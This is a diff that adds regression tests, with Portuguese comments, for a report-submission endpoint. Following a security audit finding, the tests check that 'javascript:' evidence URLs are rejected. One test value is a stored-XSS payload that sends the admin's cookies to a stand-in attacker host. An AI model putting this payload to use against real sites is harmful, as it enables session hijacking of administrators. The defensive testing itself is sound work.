@@ -48,6 +48,32 @@ describe("POST /denuncias", () => {
     expect(resposta.status).toBe(400);
   });
 
+  // Achado da auditoria de segurança (F1): "javascript:" em provaUrl executava no
+  // navegador do admin quando ele clicava em "Ver prova" pra revisar a denúncia.
+  it("recusa provaUrl com esquema diferente de http/https", async () => {
+    const token = cell.fake.criarToken({ uid: "c1", role: "cliente" });
+    const resposta = await request(app)
+      .post("/denuncias")
+      .set("Authorization", `Bearer ${token}`)
+      .send({
+        descricao: "problema grave o bastante",
+        provaUrl: "javascript:fetch('https://atacante.exemplo/x?c='+document.cookie)",
+      });
+    expect(resposta.status).toBe(400);
+  });
+
+  it("aceita provaUrl http(s) válida", async () => {
+    const token = cell.fake.criarToken({ uid: "c1", role: "cliente" });
+    const resposta = await request(app)
+      .post("/denuncias")
+      .set("Authorization", `Bearer ${token}`)
+      .send({
+        descricao: "problema grave o bastante",
+        provaUrl: "https://exemplo.com/print.png",
+      });
+    expect(resposta.status).toBe(201);
+  });
+
   it("registra a denúncia vinculada ao autor logado", async () => {
     const token = cell.fake.criarToken({ uid: "c1", role: "cliente" });
     const resposta = await request(app)
